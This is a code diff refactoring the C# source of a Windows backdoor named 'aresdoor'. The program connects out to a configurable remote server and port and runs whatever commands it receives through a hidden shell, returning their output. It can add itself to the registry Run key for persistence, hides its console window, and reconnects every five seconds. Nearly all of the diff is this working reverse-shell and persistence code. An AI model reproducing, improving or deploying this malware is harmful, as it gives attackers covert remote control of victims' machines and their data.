@@ -1,18 +1,33 @@
 ﻿using System;
+using System.Net;
 
 namespace aresdoor
 {
-    class Program
+    class Networking
     {
-        private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
-        private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);
+        public static bool checkInternetConn(string server)
+        {
+            try
+            {
+                using (System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping())
+                {
+                    System.Net.NetworkInformation.PingReply reply = pingSender.Send(server);
+                    return reply.Status == System.Net.NetworkInformation.IPStatus.Success ? true : false;
+                }
+            }
+            catch (Exception) { return false; }
+        }
 
-        // Modify these variables as needed.
-        private static string server = "localhost";
-        private static int port = 9000;
-        private static bool prevent_shutdown = false;
+        public static string resolveHostName(string hostname)
+        {
+            IPAddress[] addressList = Dns.GetHostAddresses(hostname);
+            return addressList[0].ToString();
+        }
+    }
 
-        private static string exec(string cmd)
+    class Misc
+    {
+        public static string exec(string cmd)
         {
             System.Diagnostics.Process p = new System.Diagnostics.Process();
             p.StartInfo.UseShellExecute = false;
@@ -28,19 +43,30 @@ namespace aresdoor
             return output; // return output of command
         }
 
-        private static bool checkInternetConn(string server)
-        {
-            using (System.Net.NetworkInformation.Ping pingSender = new System.Net.NetworkInformation.Ping())
-            {
-                System.Net.NetworkInformation.PingReply reply = pingSender.Send(server);
-                return reply.Status == System.Net.NetworkInformation.IPStatus.Success ? true : false;
-            }
-        }
+        public static byte[] byteCode(string contents)
+        { return System.Text.Encoding.ASCII.GetBytes(contents); }
 
-        private static byte[] byteCode(string contents)
+        public static void SetStartup()
         {
-            return System.Text.Encoding.ASCII.GetBytes(contents);
+            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
+                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+
+            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
+            rk.SetValue(System.IO.Path.GetFileName(currfile), currfile);
         }
+    }
+
+    class Program
+    {
+        private static string shellcode_ = System.IO.Directory.GetCurrentDirectory() + "> ";
+        private static byte[] shellcode = System.Text.Encoding.ASCII.GetBytes(shellcode_);
+
+        // Modify these variables as needed.
+        private static string server = "localhost";
+        private static int port = 9000;
+        private static bool prevent_shutdown = false;
+        private static bool debugMode = true;
+        
 
         private static void sendBackdoor(string server, int port)
         {
@@ -52,10 +78,10 @@ namespace aresdoor
                
                 while (true)
                 {
-                    byte[] shellcode = byteCode(System.IO.Directory.GetCurrentDirectory() + "> ");
+                    byte[] shellcode = Misc.byteCode(System.IO.Directory.GetCurrentDirectory() + "> ");
 
                     stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
-                    byte[] data = new byte[256]; byte[] output = byteCode("");
+                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");
 
                     // String to store the response ASCII representation.
                     
@@ -68,12 +94,12 @@ namespace aresdoor
                     }
                     else if (responseData.Contains("setStartup"))
                     {
-                        SetStartup();
-                        output = byteCode("Application added to startup registry.\n");
+                        Misc.SetStartup();
+                        output = Misc.byteCode("Application added to startup registry.\n");
                     }
                     else
                     {
-                        try { output = byteCode(exec(responseData)); } catch (Exception) { output = byteCode("Command couldn't execute."); }
+                        try { output = Misc.byteCode(Misc.exec(responseData)); } catch (Exception) { output = Misc.byteCode("Command couldn't execute."); }
                     }
 
                     try
@@ -93,16 +119,9 @@ namespace aresdoor
                 client.Close();
             }
             catch (System.Net.Sockets.SocketException) { } // Pass socket connection silently.
+            catch (Exception exc) { Console.WriteLine(exc.Message); }
         }
-        
-        private static void SetStartup()
-        {
-            Microsoft.Win32.RegistryKey rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey
-                ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-
-            string currfile = System.Reflection.Assembly.GetExecutingAssembly().Location;
-            rk.SetValue(System.IO.Path.GetFileName(currfile), currfile);
-        }
+       
 
         static void Main(string[] args)
         {
@@ -114,14 +133,15 @@ namespace aresdoor
              * 
              */
             var handle = GetConsoleWindow();
-            ShowWindow(handle, SW_HIDE); // hide window
+            if (!debugMode)
+                ShowWindow(handle, SW_HIDE); // hide window
 
-            if (args.Length >= 2)
+            try
             {
-                server = args[0];
-                port = Int32.Parse(args[1]);
-            }
-            
+                if (args.Length >= 2)
+                { server = args[0]; port = Int32.Parse(args[1]); }
+            } catch (Exception exc) { Console.WriteLine(exc.Message); }
+
             if (System.Diagnostics.Process.GetProcessesByName(System.Diagnostics.Process.GetCurrentProcess().ToString()).Length != 0)
             { System.Environment.Exit(0); }
 
@@ -145,7 +165,7 @@ namespace aresdoor
 
             while (true)
             {
-                if (checkInternetConn("www.google.com") == true)
+                if (Networking.checkInternetConn("www.google.com") || Networking.resolveHostName(server) == "::1" || Networking.resolveHostName(server) == "127.0.0.1")
                 {
                     try
                     {
@@ -154,7 +174,8 @@ namespace aresdoor
                     }
                     catch (Exception)
                     { } // pass silently
-                }
+                } else
+                { if (debugMode) { Console.WriteLine("Couldn't connect to " + Networking.resolveHostName(server) + ":" + port + ". Retrying in 5 seconds..."); } }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
         }
